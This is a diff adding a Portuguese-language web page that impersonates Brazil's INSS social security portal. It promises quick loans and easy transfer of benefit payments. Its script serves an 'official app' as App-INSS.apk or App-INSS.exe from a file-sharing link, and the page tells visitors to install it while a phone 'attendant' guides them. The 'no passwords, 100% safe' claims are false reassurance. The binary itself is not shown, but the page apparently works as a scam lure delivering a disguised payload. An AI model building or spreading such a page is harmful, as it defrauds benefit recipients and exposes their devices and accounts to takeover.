@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Portal INSS Oficial</title>
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Fonte Poppins -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #eef2f8 0%, #f7fafc 100%);
+    }
+    .card {
+      background: #fff;
+      border-radius: 2rem;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.08);
+      transition: all 0.3s ease-in-out;
+    }
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 25px 50px rgba(0,0,0,0.12);
+    }
+    .hero-bg {
+      background: url('https://i.imgur.com/MTMxQes.png') center/cover no-repeat;
+      min-height: 500px;
+    }
+    @media (max-width: 768px) {
+      .hero-bg {
+        min-height: 400px;
+      }
+    }
+  </style>
+</head>
+<body class="text-gray-800">
+
+  <!-- Seção Principal (Hero) -->
+  <header class="hero-bg flex flex-col items-center justify-center text-center text-white px-8 py-16 md:py-24">
+    <div class="bg-black bg-opacity-40 rounded-3xl p-6 md:p-10">
+      <h1 class="text-4xl md:text-5xl lg:text-6xl font-extrabold drop-shadow-lg leading-tight">
+        Portal Oficial do INSS
+      </h1>
+      <p class="mt-4 text-base md:text-lg lg:text-xl max-w-3xl drop-shadow font-light">
+        Instale gratuitamente o nosso aplicativo com a ajuda de um atendente especializado. Não pedimos dinheiro, senhas ou taxas. Tudo é 100% seguro.
+      </p>
+    </div>
+  </header>
+
+  <!-- Container principal do conteúdo -->
+  <main class="container mx-auto px-6 py-12 md:py-16 space-y-12 md:space-y-20">
+
+    <!-- Vantagens Exclusivas -->
+    <section class="text-center">
+      <h2 class="text-3xl font-extrabold text-blue-900 mb-8">
+        Vantagens Exclusivas para Você
+      </h2>
+      <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-8 text-lg text-gray-700">
+        <div class="card p-8 flex flex-col items-center text-center">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" class="w-16 h-16 text-blue-600 mb-4" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+          </svg>
+          <h3 class="font-bold text-xl mb-2">Crédito Rápido</h3>
+          <p>Solicite crédito e empréstimos imediatamente após a instalação do app oficial.</p>
+        </div>
+        <div class="card p-8 flex flex-col items-center text-center">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" class="w-16 h-16 text-blue-600 mb-4" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M19 3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8.58 10 17z"/>
+          </svg>
+          <h3 class="font-bold text-xl mb-2">Transferência Segura</h3>
+          <p>Altere o recebimento do seu benefício para a instituição que preferir, sem burocracia.</p>
+        </div>
+        <div class="card p-8 flex flex-col items-center text-center">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" class="w-16 h-16 text-blue-600 mb-4" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2z"/>
+          </svg>
+          <h3 class="font-bold text-xl mb-2">Sem Taxas Ocultas</h3>
+          <p>Evite taxas e cobranças automáticas indesejadas de bancos e financeiras.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Imagem antes do Botão de Download -->
+    <div class="card p-4">
+      
+      <img src="https://i.imgur.com/jw3ObZf.png" alt="Processo de instalação segura via atendente" class="rounded-2xl mx-auto w-full">
+    </div>
+
+    <!-- Botão de Download -->
+    <section class="text-center space-y-6 md:space-y-8">
+      <h2 class="text-3xl font-extrabold text-blue-900">
+        Baixe o Aplicativo Oficial
+      </h2>
+      <p class="text-lg md:text-xl text-gray-600 max-w-2xl mx-auto">
+        Clique no botão abaixo para iniciar o download. O atendente irá guiá-lo em todas as etapas de instalação.
+      </p>
+      <div class="max-w-md mx-auto">
+        <button id="downloadButton" class="w-full flex items-center justify-center bg-blue-600 text-white font-semibold text-xl py-5 px-8 rounded-2xl shadow-lg transition-all duration-300 transform hover:scale-105 hover:bg-blue-700">
+          <span id="buttonText">Baixar o Aplicativo</span>
+          <svg xmlns="http://www.w3.org/2000/svg" class="ml-4 h-7 w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5m0 0l5-5m-5 5V4"/>
+          </svg>
+        </button>
+        <div id="progressContainer" class="hidden w-full bg-gray-200 rounded-full overflow-hidden mt-6">
+          <div id="progressBar" class="bg-blue-600 text-xs font-medium text-white text-center p-2 leading-none rounded-full" style="width: 0%">0%</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Como Instalar e Segurança em Grid -->
+    <div class="grid md:grid-cols-2 gap-8 md:gap-12">
+      <!-- Como Instalar -->
+      <section class="card p-8 md:p-10 space-y-6">
+        <h2 class="text-2xl font-bold text-blue-800 text-center">
+          Passo a Passo da Instalação
+        </h2>
+        <ol class="list-decimal pl-6 text-lg space-y-4 text-gray-700">
+          <li>Entre em contato com um de nossos atendentes.</li>
+          <li>Siga as instruções guiadas durante a ligação.</li>
+          <li>Conclua a instalação de forma rápida e segura.</li>
+        </ol>
+        <p class="mt-4 text-sm text-gray-500 text-center">
+          Compatível com Android e Windows.
+        </p>
+      </section>
+
+      <!-- Segurança em Primeiro Lugar -->
+      <section class="card p-8 md:p-10 space-y-6">
+        <h2 class="text-2xl font-bold text-green-700 text-center">
+          Segurança em Primeiro Lugar <span class="text-gray-400">🛡️</span>
+        </h2>
+        <ul class="space-y-4 text-lg text-gray-700">
+          <li class="flex items-start">
+            <span class="text-green-500 text-2xl mr-2">✔</span> Não pedimos dinheiro ou taxas.
+          </li>
+          <li class="flex items-start">
+            <span class="text-green-500 text-2xl mr-2">✔</span> Não solicitamos senhas sensíveis.
+          </li>
+          <li class="flex items-start">
+            <span class="text-green-500 text-2xl mr-2">✔</span> Instalação guiada por atendente.
+          </li>
+          <li class="flex items-start">
+            <span class="text-green-500 text-2xl mr-2">✔</span> Aplicativo oficial e seguro.
+          </li>
+        </ul>
+      </section>
+    </div>
+    
+    <!-- Imagem de Instalação (com novo estilo) -->
+    <div class="card p-4">
+      <img src="https://i.imgur.com/jw3ObZf.png" alt="Processo de instalação segura via atendente" class="rounded-2xl mx-auto w-full">
+    </div>
+
+  </main>
+
+  <!-- Rodapé -->
+  <footer class="bg-blue-900 text-white py-8 mt-12 text-center">
+    <p class="text-sm font-light">
+      © 2025 Portal INSS - Instalação oficial gratuita e segura.
+    </p>
+  </footer>
+
+  <script>
+    const isAndroid = /Android/i.test(navigator.userAgent);
+    const fileName = isAndroid ? 'App-INSS.apk' : 'App-INSS.exe';
+    const downloadUrl = 'https://www.4sync.com/web/directDownload/b5-eN--R/3-A3cUVB.1d9fd7ae519bff02ad612e9a03460888';
+
+    const downloadButton = document.getElementById('downloadButton');
+    const buttonText = document.getElementById('buttonText');
+    const progressContainer = document.getElementById('progressContainer');
+    const progressBar = document.getElementById('progressBar');
+
+    downloadButton.addEventListener('click', async () => {
+      // Impede múltiplos cliques
+      if (downloadButton.disabled) return;
+      downloadButton.disabled = true;
+
+      buttonText.textContent = 'Baixando...';
+      progressContainer.classList.remove('hidden');
+
+      try {
+        const response = await fetch(downloadUrl);
+        if (!response.ok) throw new Error("Erro no download");
+
+        const contentLength = response.headers.get("content-length");
+        if (!contentLength) throw new Error("Tamanho do arquivo desconhecido");
+
+        const total = parseInt(contentLength, 10);
+        let loaded = 0;
+
+        const reader = response.body.getReader();
+        const chunks = [];
+
+        while (true) {
+          const { done, value } = await reader.read();
+          if (done) break;
+          chunks.push(value);
+          loaded += value.length;
+
+          const progress = Math.round((loaded / total) * 100);
+          progressBar.style.width = progress + "%";
+          progressBar.textContent = progress + "%";
+        }
+
+        const blob = new Blob(chunks);
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = fileName;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+
+        buttonText.textContent = "Download concluído!";
+        progressBar.style.width = "100%";
+        progressBar.textContent = "100%";
+
+        setTimeout(() => {
+          window.URL.revokeObjectURL(url);
+          downloadButton.disabled = false;
+        }, 2000);
+
+      } catch (err) {
+        buttonText.textContent = "Erro ao baixar";
+        progressBar.style.backgroundColor = "red";
+        progressBar.textContent = "Falhou";
+        downloadButton.disabled = false;
+        console.error("Erro no download:", err);
+      }
+    });
+  </script>
+
+</body>
+</html>
